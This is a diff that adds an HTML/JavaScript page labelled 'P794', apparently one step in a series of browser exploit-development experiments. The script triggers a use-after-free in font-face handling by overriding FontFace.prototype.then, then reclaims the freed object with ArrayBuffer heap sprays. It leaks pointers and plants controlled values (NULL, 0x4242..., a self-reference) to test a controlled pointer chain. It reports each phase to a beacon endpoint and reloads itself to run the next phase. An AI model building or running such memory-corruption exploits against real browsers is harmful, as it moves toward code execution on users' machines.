@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P794 — Controlled Sub-Pointer Chain</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; color: #7ee787; font-size: 13px; white-space: pre-wrap; word-break: break-all; }
+</style>
+<script>
+'use strict';
+/* ============================================================
+ * P794 — Controlled Sub-Pointer Chain
+ *
+ * P793 confirmed: two-pass works reliably. Engine writes same
+ * fields (q0/q11/q12/q13) regardless of q1 redirect.
+ *
+ * KEY INSIGHT: q11 = m_buffer = ptr to inline buffer at offset
+ * 0x68 in the CSSFontFace struct. When engine follows q1 → it
+ * reads from [q1+0] = data at offset 0x68 = q13's slot.
+ *
+ * Since pass1's AB reclaimed the CSSFontFace, q1=q11 means
+ * engine reads from pass1 AB's q13 slot. We CONTROL that!
+ *
+ * TEST PLAN:
+ * A) Pass 1: zeroed UAF → dump, get q11/q13
+ * B) Modify pass1 AB: set q13 slot = 0 (NULL-safe test)
+ * C) Pass 2: q1 = q11 → engine reads [q1+0] = our 0 → ??
+ * D) Pass 2 full dump + compare
+ *
+ * E) BONUS: if A-D works, try q13 = 0x4242... → crash test
+ *    (confirm engine dereferences the sub-pointer)
+ *
+ * CRASH_CLASS: HIGH — controlled pointer chain
+ * ============================================================ */
+
+window.onerror = function(msg, url, line){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P794-JSERR&data=' + encodeURIComponent((msg||'') + ' L' + line) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+};
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P794-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+}
+
+var out;
+function log(s){ if(out) out.textContent += s + '\n'; }
+
+function dumpView(view, label){
+  var parts = [];
+  for (var q = 0; q < 24; q++){
+    if (view[q] !== 0n) parts.push('q' + q + '=0x' + h16(view[q]));
+  }
+  var chunk = '';
+  for (var i = 0; i < parts.length; i++){
+    if (chunk.length + parts[i].length > 600){
+      b(label, chunk); chunk = '';
+    }
+    if (chunk.length > 0) chunk += '|';
+    chunk += parts[i];
+  }
+  if (chunk.length > 0) b(label, chunk);
+  return parts;
+}
+
+/* Track which test phase via localStorage */
+function getTestPhase(){
+  try { return parseInt(localStorage.getItem('p794_phase') || '0'); }
+  catch(e){ return 0; }
+}
+function setTestPhase(n){
+  try { localStorage.setItem('p794_phase', String(n)); } catch(e){}
+}
+
+function run(){
+  out = document.getElementById('out');
+  out.textContent = 'P794 — Controlled Sub-Pointer Chain\n====================================\n\n';
+
+  var testPhase = getTestPhase();
+  b('BOOT', 'phase=' + testPhase);
+
+  if (testPhase === 0){
+    /* Phase 0: NULL sub-pointer test (q13 slot zeroed) */
+    log('Phase 0: NULL sub-pointer test');
+    log('Will zero q13 slot, then redirect q1 = q11');
+    log('If engine reads [q1+0] = 0 → NULL check → survive\n');
+    setTestPhase(1);
+    doTwoPass(0n, 'NULL');
+  } else if (testPhase === 1){
+    /* Phase 1: Crash test (q13 slot = 0x4242...) */
+    log('Phase 1: Crash sub-pointer test');
+    log('Will set q13 slot = 0x4242..., then redirect q1 = q11');
+    log('If engine reads [q1+0] = 0x4242... → deref → crash\n');
+    setTestPhase(2);
+    doTwoPass(0x4242424242424242n, 'CRASH');
+  } else if (testPhase === 2){
+    /* Phase 2: Self-ref test (q13 slot = q11 itself → circular) */
+    log('Phase 2: Self-reference test');
+    log('Will set q13 slot = q11 → engine reads q11 → follows → reads q11 again → ...\n');
+    setTestPhase(3);
+    doTwoPass('self', 'SELFREF');
+  } else {
+    log('All phases complete! Check beacons for P794-*');
+    b('ALLCOMPLETE', '');
+    try { localStorage.removeItem('p794_phase'); } catch(e){}
+  }
+}
+
+function doTwoPass(subPtrValue, label){
+  /* ============================================================
+   * PASS 1: Zeroed spray UAF — get baseline + q11
+   * ============================================================ */
+  log('Pass 1: Zeroed UAF...');
+
+  var st1 = document.createElement('style');
+  st1.textContent = '@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(st1);
+
+  var face1 = new FontFace('f1', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(face1);
+  void face1.loaded;
+
+  var abs1 = [], fired1 = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired1) return undefined;
+      fired1 = true;
+      if (st1){ st1.remove(); st1.textContent = ''; st1 = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      for (var k = 0; k < 64; k++) abs1.push(new ArrayBuffer(192));
+      try { document.fonts.check('1em bb1'); } catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em f1, bb1', 'AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best1 = -1;
+    for (var i = 0; i < abs1.length; i++){
+      var v = new BigUint64Array(abs1[i]);
+      if (v[0] === 1n){ best1 = i; break; }
+    }
+    if (best1 < 0){
+      b(label + '-P1-MISS', 'no_reclaim');
+      log('Pass 1 MISS. Reloading...');
+      setTimeout(function(){ location.reload(); }, 500);
+      return;
+    }
+
+    var view1 = new BigUint64Array(abs1[best1]);
+    var q11_1 = view1[11];
+    var q13_1 = view1[13];
+
+    b(label + '-P1-HIT', 'q11=0x' + h16(q11_1) + '|q13=0x' + h16(q13_1));
+    log('Pass 1 HIT: q11=0x' + h16(q11_1) + ' q13=0x' + h16(q13_1));
+
+    /* ============================================================
+     * MODIFY pass1 AB's q13 slot (offset 0x68 = index 13)
+     * This is what the engine will read when it follows q1=q11
+     * because q11 = m_buffer = ptr to offset 0x68 in the struct
+     * ============================================================ */
+    var actualSubVal;
+    if (subPtrValue === 'self'){
+      actualSubVal = q11_1;  /* self-reference: engine reads q11 → loops? */
+    } else {
+      actualSubVal = subPtrValue;
+    }
+
+    var origQ13 = view1[13];
+    view1[13] = actualSubVal;
+    b(label + '-MODIFY', 'q13_was=0x' + h16(origQ13) + '|q13_now=0x' + h16(actualSubVal));
+    log('Modified pass1 AB q13 slot: was 0x' + h16(origQ13) + ' → now 0x' + h16(actualSubVal));
+
+    /* Also try modifying more inline buffer slots (q14-q17) */
+    /* q14 (offset 0x70) was a crash field in P789 — might be
+       the SECOND element the engine reads from inline buffer */
+    var origQ14 = view1[14];
+    view1[14] = 0n;  /* zero out q14 to prevent secondary crash */
+    view1[15] = 0n;
+    view1[16] = 0n;
+    view1[17] = 0n;
+
+    /* Warmup */
+    var warmup = [];
+    for (var i = 0; i < 128; i++){
+      var ab = new ArrayBuffer(192);
+      warmup.push(ab);
+    }
+
+    /* ============================================================
+     * PASS 2: UAF with q1 = q11 (engine follows into our data)
+     * ============================================================ */
+    log('\nPass 2: Redirect q1 = q11 = 0x' + h16(q11_1));
+    log('Engine will read [q1+0] = our modified q13 = 0x' + h16(actualSubVal));
+
+    var st2 = document.createElement('style');
+    st2.textContent = '@font-face{font-family:bb2;src:local(Arial);unicode-range:U+0044;}';
+    document.head.appendChild(st2);
+
+    var face2 = new FontFace('f2', 'local(Helvetica)', { unicodeRange: 'U+0043' });
+    document.fonts.add(face2);
+    void face2.loaded;
+
+    var abs2 = [], fired2 = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get: function(){
+        if (fired2) return undefined;
+        fired2 = true;
+        if (st2){ st2.remove(); st2.textContent = ''; st2 = null; }
+        try { document.fonts.delete(this); } catch(e){}
+        document.body.offsetHeight;
+
+        for (var k = 0; k < 64; k++){
+          var ab = new ArrayBuffer(192);
+          var v = new BigUint64Array(ab);
+          v[1] = q11_1;  /* redirect q1 to pass1's inline buffer */
+          abs2.push(ab);
+        }
+
+        try { document.fonts.check('1em bb2'); } catch(e){}
+        document.body.offsetHeight;
+        return undefined;
+      },
+      set: function(){}
+    });
+
+    document.fonts.load('1em f2, bb2', 'CD');
+
+    setTimeout(function(){
+      delete FontFace.prototype.then;
+
+      /* Find reclaimed */
+      var best2 = -1;
+      for (var i = 0; i < abs2.length; i++){
+        var v = new BigUint64Array(abs2[i]);
+        if (v[0] === 1n){ best2 = i; break; }
+      }
+
+      if (best2 < 0){
+        var pfOnly = 0;
+        for (var i = 0; i < abs2.length; i++){
+          var v = new BigUint64Array(abs2[i]);
+          if (v[1] === q11_1 && v[0] === 0n) pfOnly++;
+        }
+        b(label + '-P2-MISS', 'pf=' + pfOnly);
+        log('Pass 2 MISS (prefill_only=' + pfOnly + ')');
+
+        /* Check if pass1 AB was modified by engine */
+        var p1mod = [];
+        for (var q = 0; q < 24; q++){
+          if (q === 13 || q === 14 || q === 15 || q === 16 || q === 17) continue;
+          if (view1[q] !== 0n && q !== 0 && q !== 11 && q !== 12){
+            p1mod.push('q' + q + '=0x' + h16(view1[q]));
+          }
+        }
+        if (p1mod.length > 0) b(label + '-P1-CHANGED', p1mod.join('|'));
+
+        /* Auto-reload for next test */
+        log('\nReloading for next phase...');
+        setTimeout(function(){ location.reload(); }, 500);
+        return;
+      }
+
+      var view2 = new BigUint64Array(abs2[best2]);
+      var hadQ1 = (view2[1] === q11_1);
+
+      /* Full dump */
+      var p2parts = dumpView(view2, label + '-P2-DUMP');
+      b(label + '-P2-HIT', 'i=' + best2 + '|hadQ1=' + hadQ1 +
+        '|q0=0x' + h16(view2[0]) + '|q11=0x' + h16(view2[11]) +
+        '|q13=0x' + h16(view2[13]));
+
+      log('\nPass 2 HIT (#' + best2 + '):');
+      for (var q = 0; q < 24; q++){
+        if (view2[q] !== 0n){
+          log('  q' + q + ' = 0x' + h16(view2[q]));
+        }
+      }
+
+      /* Check if pass1 AB was modified by the engine following the chain */
+      var p1changes = [];
+      for (var q = 0; q < 24; q++){
+        var expected;
+        if (q === 0) expected = 1n;
+        else if (q === 11) expected = q11_1;
+        else if (q === 12) expected = 0n;
+        else if (q === 13) expected = actualSubVal;
+        else if (q === 14 || q === 15 || q === 16 || q === 17) expected = 0n;
+        else expected = 0n;
+        if (view1[q] !== expected){
+          p1changes.push('q' + q + ':exp=0x' + h16(expected) + '|got=0x' + h16(view1[q]));
+        }
+      }
+      if (p1changes.length > 0){
+        b(label + '-P1-SIDEEFFECT', p1changes.join('|'));
+        log('\n*** PASS1 AB MODIFIED (engine wrote through chain!):');
+        for (var i = 0; i < p1changes.length; i++) log('  ' + p1changes[i]);
+      } else {
+        b(label + '-P1-CLEAN', 'no_sideeffect');
+        log('\nPass1 AB NOT modified by engine chain.');
+      }
+
+      /* Compare p2 fields vs P793 baseline (q0/q11/q13 only) */
+      var newInP2 = [];
+      for (var q = 0; q < 24; q++){
+        if (q === 0 || q === 1 || q === 11 || q === 12 || q === 13) continue;
+        if (view2[q] !== 0n) newInP2.push('q' + q + '=0x' + h16(view2[q]));
+      }
+      if (newInP2.length > 0){
+        b(label + '-NEW', newInP2.join('|'));
+        log('\n*** NEW non-zero fields in pass 2: ' + newInP2.join(', '));
+      }
+
+      b(label + '-DONE', 'complete');
+      log('\n=== Phase ' + label + ' COMPLETE ===\n');
+
+      /* Auto-reload for next phase */
+      log('Reloading for next phase...');
+      setTimeout(function(){ location.reload(); }, 800);
+
+    }, 500);
+  }, 400);
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script>
+</head>
+<body>
+  <pre id="out">P794 — Controlled Sub-Pointer Chain — Loading...</pre>
+</body>
+</html>
